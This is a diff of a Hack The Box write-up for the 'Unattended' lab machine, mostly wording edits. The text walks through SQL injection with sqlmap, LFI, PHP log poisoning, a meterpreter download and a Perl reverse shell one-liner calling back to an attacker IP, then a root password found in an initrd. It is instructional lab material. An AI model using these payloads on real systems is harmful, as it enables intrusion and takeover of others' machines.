@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Unattended - Hack The Box
-excerpt: "TBA"
-date: 2019-12-31
+excerpt: "Unattended was a pretty tough box with a second order SQL injection in the PHP app. By injecting PHP code into the web server access logs through the User-Agent header, I can get RCE by accessing by including the logs using the SQL injection. I didn't quite understand what the priv esc was about though. I found the initrd archive and stumbled upon the contents by doing a grep on the box author's name."
+date: 2019-08-24
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-unattended/unattended_logo.png
@@ -14,19 +14,21 @@ tags:
   - linux
   - sqli
   - sqlmap
+  - 2nd order injection
   - php
   - lfi
   - ipv6
   - firewall
+  - uinitrd
 ---
 
 ![](/assets/images/htb-writeup-unattended/unattended_logo.png)
 
-TBA
+Unattended was a pretty tough box with a second order SQL injection in the PHP app. By injecting PHP code into the web server access logs through the User-Agent header, I can get RCE by accessing by including the logs using the SQL injection. I didn't quite understand what the priv esc was about though. I found the initrd archive and stumbled upon the contents by doing a grep on the box author's name.
 
 ## Summary
 
-- Find vhost from the certification information
+- Get the vhost from the SSL certificate information
 - Enumerate the website to find that the only parameter that seems dynamic is the `id` parameter
 - Run sqlmap against the site and find both a boolean-blind and time-based boolean injection in the `id` parameter
 - Slowly dump what seems to be the most relevant tables: `config`, `idnames` and `filepath`
@@ -38,19 +40,17 @@ TBA
 - Modify the table `config`, change the `checkrelease` parameter to point to the reverse shell perl script
 - Wait for the cronjob to run and get a shell as `guly`
 - Find that the server has an IPv6 address and that SSH is not firewalled on IPv6
-- Check groups that `guly` is part now, find that he is part of `grub` which is not a standard Debian group
+- Check groups that `guly` is part of, find that he is part of `grub` which is not a standard Debian group
 - Look for files owned by group `grub`, find `/boot/initrd.img-4.9.0-8-amd64`
 - Download, unpack the file, find a `uinitrd` binary which is not standard in Debian
 - Search for box maker name (guly) in the unpacked files and find comment followed by `/sbin/uinitrd c0m3s3f0ss34nt4n1` in `cryptoroot` file
-- Can't execute `uinitrd` on the box because of permissions but I can upload my own copy and execute it from `/home/guly`
-- Output is 40 characters hex. By passing the `c0m3s3f0ss34nt4n1` argument we get a different SHA1 output (probably some encryption key or something)
+- Can't execute `uinitrd` on the box because of permissions but we can upload our own copy and execute it from `/home/guly`
+- Output is 40 characters hex. By passing the `c0m3s3f0ss34nt4n1` argument we get a different SHA1 output
 - The 40 characters hex string output is the root password and can `su` root with it
 
-## Detailed steps
+### Portscan
 
-### Nmap
-
-Not much running on this box but I make note of the `www.nestedflanders.htb` SSL certificate name. I've added this to my `/etc/hosts` file as well as other subdomains like `admin.*`, `dev.*`, etc. in case I need them later.
+There's not much running on this box but I make note of the `www.nestedflanders.htb` SSL certificate name. I'll add this to my `/etc/hosts` file as well as other subdomains like `admin.*`, `dev.*`, etc. in case I need them later.
 
 ```
 # nmap -sC -sV -p- 10.10.10.126
@@ -63,7 +63,7 @@ PORT    STATE SERVICE  VERSION
 |_http-server-header: nginx/1.10.3
 |_http-title: 503 Service Temporarily Unavailable
 443/tcp open  ssl/http nginx 1.10.3
-| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
+| ssl-cert: Subject: commonName=www.nestedflanders.htb
 | Not valid before: 2018-12-19T09:43:58
 |_Not valid after:  2021-09-13T09:43:58
 ```
@@ -74,15 +74,15 @@ The default page on the Port 80 web server returns a single dot.
 
 ![](/assets/images/htb-writeup-unattended/dot.png)
 
-Nothing interesting returned from gobuster.
+Nothing interesting is returned from gobuster so I won't include the output here.
 
 ### Web site enumeration - Port 443
 
-The default apache configuration is shown here.
+The default apache page is shown here.
 
 ![](/assets/images/htb-writeup-unattended/default.png)
 
-The response contains the `X-Upstream: 127.0.0.1:8080` header which indicates the Nginx is probably fronting the HTTPS page and proxying back to Apache2 on the backend.
+The response contains the `X-Upstream: 127.0.0.1:8080` header which indicates that Nginx is probably fronting the HTTPS page and proxying back to Apache2 on the backend.
 
 There's also a `index.php` and `/dev/` page which I found by running gobuster.
 
@@ -92,7 +92,7 @@ There's also a `index.php` and `/dev/` page which I found by running gobuster.
 /index.php (Status: 200)
 ```
 
-The `/dev/` doesn't have anything interesting. I checked the vhost `dev.nestedflanders.htb` but that doesn't seem valid and I get directed to the page with the single dot.
+The `/dev/` doesn't have anything interesting. I check the vhost `dev.nestedflanders.htb` but that doesn't seem valid and I get directed to the page with the single dot.
 
 ![](/assets/images/htb-writeup-unattended/dev.png)
 
@@ -104,13 +104,13 @@ The `index.php` shows the followings pages that are included with the `id` param
 
 ![](/assets/images/htb-writeup-unattended/ned3.png)
 
-There's nothing a first glance that seems dynamic other than the `id` parameter used to include pages. After manually trying other parameters, I found that the `name` parameter is used by the page to change the name displayed and is vulnerable to XSS. It's a reflected XSS so I didn't see how this would be useful here. Moving on.
+There's nothing at first glance that seems dynamic other than the `id` parameter used to include pages. After manually trying other parameters, I find that the `name` parameter is used by the page to change the name displayed and is vulnerable to XSS. It's a reflected XSS so I don't see how this would be useful here. Moving on.
 
 ### Finding the first SQL injection
 
 ![](/assets/images/htb-writeup-unattended/xss.png)
 
-Next, I ran `sqlmap` againt the page to see if I could find a SQL injection in the `id` parameter. I found that the database backend if MySQL and that the page contains two SQL injections: a boolean-based blind and time-based boolean injection. Originally when I first ran sqlmap with `id=25` it only found that time-based blind injection but when I specified the `id=587` it found both. I think this happens because the default page returned by index.php is the one from id 25, so the boolean-blind injection can only work with the other two pages.
+Next, I run `sqlmap` on the page to see if I can find a SQL injection in the `id` parameter. I find that the database backend is MySQL and that the page contains two SQL injections: a boolean-based blind and time-based boolean injection. Originally when I first ran sqlmap with `id=25` it only found that time-based blind injection but when I specified the `id=587` it found both. I think this happens because the default page returned by index.php is the one from id 25, so the boolean-blind injection can only work with the other two pages.
 
 ```
 # sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -p id
@@ -131,7 +131,7 @@ web application technology: Nginx 1.10.3
 back-end DBMS: MySQL >= 5.0.12
 ```
 
-The boolean-blind injection is faster to dump the database and is less susceptible to instability if other people are hammering the box. First I checked the current database used, then dumped the list of tables from database `neddy`:
+The boolean-blind injection is faster to dump the database and is less susceptible to instability if other people are hammering the box. First I check the current database used, then dump the list of tables from database `neddy`:
 
 ```
 # sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --current-db
@@ -160,7 +160,7 @@ Database: neddy
 +--------------+
 ```
 
-I focused on `config`, `idname` and `filepath` tables first. The other tables contain a lot of rows and it would take too long to dump everything. I increased the thread count to make it a bit faster.
+I'll focus on `config`, `idname` and `filepath` tables first. The other tables contain a lot of rows and it would take too long to dump everything. I increase the thread count to make it a bit faster.
 
 ```
 # sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -T config,filepath,idname --technique B -D neddy --dump --threads 10
@@ -249,7 +249,7 @@ Table: filepath
 
 Here are my observations for each of the table:
 
-- `config`: There's a lot of data here, including some potential credentials in `ftp_pass`. There's also a `checkrelease` option that points to a perl script in `/home/guly/`.
+- `config`: There's a lot of data here, including some potential credentials in `ftp_pass`. There's also a `checkrelease` option that points to a perl script in `/home/guly/`
 - `idname`: That table contains the mapping between the ID specified in the GET request and a name
 - `filepath`: The name from the previous table seems to be referenced here in this table
 
@@ -257,9 +257,9 @@ Here are my observations for each of the table:
 
 I have the database table with some possible credentials but there's nothing else open on this box except HTTP and HTTPS and I haven't found any other hidden directory and/or vhost. There's possibly a service listening on an IPv6 address but I don't know the address and I can't scan the entire /64 because that address space is too large to scan.
 
-The md5 hash of the last two entries in the filepath table are the md5sum of the strings `submission` and `smtp`. Thinking that this was a hint, I hashed a couple of wordlists and ran those through wfuzz but was unsuccesfull in finding any other files.
+The MD5 hash of the last two entries in the filepath table are the md5sum of the strings `submission` and `smtp`. Thinking that this was a hint, I hashed a couple of wordlists and ran those through wfuzz but was unsuccesfull in finding any other files.
 
-I don't have the PHP source code but I can guess that there are two SQL queries being issued from index.php: one to map the ID to the name, and another other to map the name to the filename. If we can perform an injection on the first query, we can probably do the same on the second one and control which file gets included by the PHP code, basically getting an LFI.
+I don't have the PHP source code but I can guess that there are two SQL queries being issued from index.php: one to map the ID to the name, and another one to map the name to the filename. If I can perform an injection on the first query, I can probably do the same on the second one and control which file gets included by the PHP code, basically getting an LFI.
 
 I don't like testing SQL injections within Burp so I made a script to help me with the process:
 
@@ -279,7 +279,7 @@ while True:
     print soup.body
 ```
 
-The first thing I tested was to check if I could display the Contact page by returning `contact` instead of `main` from the first query against the `idname` table.
+The first thing I test is to check if I can display the Contact page by returning `contact` instead of `main` from the first query against the `idname` table.
 
 This is the query I want to run against the `idname` table: `SELECT name FROM idname WHERE id = '25' UNION SELECT ALL 'contact'`
 
@@ -363,7 +363,7 @@ I have access to the nginx access logs and I can see that the `User-Agent` heade
 10.10.14.23 - - [14/Apr/2019:21:38:00 -0400] "GET /index.php?id=25'%20union%20select%20all%20%22invalid'%20union%20select%20all%20'/home/guly/user.txt%22%20--%20- HTTP/1.1" 200 398 "-" "python-requests/2.18.4"
 ```
 
-I control the `User-Agent` header so I can potentially inject PHP code in the access logs and trigger it by making a request to the log file using the LFI from the SQL injection. After some trial and error I found that we can inject any PHP code we want in the `User-Agent` header and that the `system` function is not disabled. To make sure I don't end up with too much PHP statements in the access logs and kill the box, I reset the content of the access log file every time I run a command.
+I control the `User-Agent` header so I can potentially inject PHP code in the access logs and trigger it by making a request to the log file using the LFI from the SQL injection. After some trial and error I find that Iwe can inject any PHP code I want in the `User-Agent` header and that the `system` function is not disabled. To make sure I don't end up with too much PHP statements in the access logs and kill the box, I reset the content of the access log file every time I run a command.
 
 Here's the script I made to execute commands. I could have put more regex in there to clean up the output a bit more but that'll do for now.
 
@@ -418,7 +418,7 @@ Python and netcat are not installed on this box. I tried using perl to spawn a s
 [No output!]
 ```
 
-I downloaded netcat on the box but I didn't get any callback when I try to execute it. When I looked at the filesystem mounts I saw that the temporary locations are all mounted as `noexec` so I can't run any binary that I upload there.
+I download netcat on the box but I don't get any callback when I try to execute it. When I look at the filesystem mounts I see that the temporary locations are all mounted as `noexec` so I can't run any binary that I upload there.
 
 ```
 > mount
@@ -435,7 +435,7 @@ tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
 
 ### First shell using Metasploit
 
-I can't execute code but if I upload a PHP meterpreter payload into `/tmp` I can execute it since the `php` binary is in the main partition that is executable.
+If I upload a PHP meterpreter payload into `/tmp` I can execute it since the `php` binary is in the main partition that is executable.
 
 ```
 > wget http://10.10.14.23:443/snowscan.php -O /tmp/snowscan.php
@@ -443,7 +443,7 @@ I can't execute code but if I upload a PHP meterpreter payload into `/tmp` I can
 > php /tmp/snowscan.php
 ```
 
-I got a meterpreter session a few seconds after.
+I get a meterpreter session a few seconds after.
 
 ```
 msf5 exploit(multi/handler) > run
@@ -460,7 +460,7 @@ meterpreter > getuid
 Server username: www-data (33)
 ```
 
-The first thing I did once I got a shell was check if I could access `user.txt` but the `/home/guly` directory isn't readble by `www-data`. Next I grabbed the MySQL credentials from `/var/www/html/index.php`:
+The first thing I do once I have a shell is check if I can access `user.txt` but the `/home/guly` directory isn't readble by `www-data`. Next I grab the MySQL credentials from `/var/www/html/index.php`:
 
 ```
 $servername = "localhost";
@@ -491,9 +491,9 @@ products
 
 ### Escalating to a new shell as user guly
 
-I thought about that `checkrelease` parameter in the `config` table I saw earlier. It currently contains `/home/guly/checkbase.pl;/home/guly/checkplugins.pl;` so I guessed that this may be a script running at specific interval. I have access to the database so I can change this value.
+I thought about that `checkrelease` parameter in the `config` table I saw earlier. It currently contains `/home/guly/checkbase.pl;/home/guly/checkplugins.pl;` so I guess that this may be a script running at specific interval. I have access to the database so I can change this value.
 
-I used the standard perl reverse shell payload, then dropped it into `/var/lib/php/sessions` since it's the only directory in the main executable partition I have write access to:
+I use the standard perl reverse shell payload, then drop it into `/var/lib/php/sessions` since it's the only directory in the main executable partition I have write access to:
 
 ```perl
 use Socket;$i="10.10.14.23";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
@@ -508,7 +508,7 @@ Length: 209 [text/x-perl]
 Saving to: '/var/lib/php/sessions/shell.pl'
 ```
 
-Then I updated the database configuration to point to the new script:
+Then I update the database configuration to point to the new script:
 
 ```
 mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e "update config set option_value = '/usr/bin/perl /var/lib/php/sessions/shell.pl;' where id='86'" neddy
@@ -517,7 +517,7 @@ id	option_name	option_value
 86	checkrelease	/usr/bin/perl /var/lib/php/sessions/shell.pl;
 ```
 
-After a minute or two I got a connection back:
+After a minute or two I get a connection back:
 
 ```
 root@ragingunicorn:~/htb/unattended# nc -lvnp 80
@@ -534,7 +534,7 @@ $ cat user.txt
 9b413f...
 ```
 
-IPv6 is configured on this server, I will run an nmap scan against the IPv6 address to see if I can find any other open port.
+IPv6 is configured on this server so I will run an nmap scan against the IPv6 address to see if I can find any other open port.
 
 ```
 $ ip a
@@ -548,7 +548,7 @@ $ ip a
        valid_lft forever preferred_lft forever
 ```
 
-As expected, I found SSH listening:
+As expected, I find SSH listening:
 
 ```
 # nmap -6 -p- dead:beef::250:56ff:feb2:7bc2
@@ -578,7 +578,7 @@ uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),3
 
 ### Priv esc
 
-I checked the groups that `guly` is a member of and the `grub` group seemed suspicious to me. According to [https://wiki.debian.org/SystemGroups](https://wiki.debian.org/SystemGroups) this isn't a standard group.
+I check the groups that `guly` is a member of and the `grub` group seems suspicious to me. According to [https://wiki.debian.org/SystemGroups](https://wiki.debian.org/SystemGroups) this isn't a standard group.
 
 I'll do a search for files owned by the `grub` group and find a single file: `/boot/initrd.img-4.9.0-8-amd64`
 
@@ -628,7 +628,7 @@ drwxr-xr-x 2 root root     4096 Apr 15 02:42 sbin
 drwxr-xr-x 8 root root     4096 Apr 15 02:42 scripts
 ```
 
-There's a lot of files in there and nothing standards out at first. Doing a search for `guly`, the box creator's name I find an interesting file:
+There's a lot of files in there and nothing standards out at first. Doing a search for `guly` (the box creator name) I find an interesting file:
 
 ```
 root@ragingunicorn:~/htb/unattended/tmp# grep -r -A 5 -B 5 guly *
@@ -647,7 +647,7 @@ scripts/local-top/cryptroot-				sleep 3
 scripts/local-top/cryptroot-				continue
 ```
 
-The `/sbin/uinitrd c0m3s3f0ss34nt4n1` entry is very peculiar. If I do a google search on `c0m3s3f0ss34nt4n1` I don't find anything so I assume this has been created or modified on purpose. I can't find any man file for `uinitrd` and googling doesn't find any conclusive. I was expecting to find this is a standard Linux command but it doesn't seem to be the case.
+The `/sbin/uinitrd c0m3s3f0ss34nt4n1` entry is very peculiar. If I do a google search on `c0m3s3f0ss34nt4n1` I don't find anything so I assume this has been created or modified on purpose. I can't find any man file for `uinitrd` and googling doesn't find anything conclusive. I was expecting to find this is a standard Linux command but it doesn't seem to be the case.
 
 Also, `c0m3s3f0ss34nt4n1` = `comesefosseantani` and the box creator is Italian...
 
@@ -690,9 +690,9 @@ guly@unattended:~$ ./unitrd 123456
 d98e9572902fce6c98942ffab1bbd3a6d51ff31c
 ```
 
-Those look like SHA1 hashes but I don't know what they mean. I tried the first one as the root password but it didn't work.
+Those look like SHA1 hashes but I don't know what they mean. I try the first one as the root password but it doesn't work.
 
-However when I ran the program with the `c0m3s3f0ss34nt4n1` argument, I was able to `su` as root with the hash I got:
+However when I run the program with the `c0m3s3f0ss34nt4n1` argument, I am able to `su` as root with the hash I got:
 
 ```
 guly@unattended:~$ ./unitrd c0m3s3f0ss34nt4n1
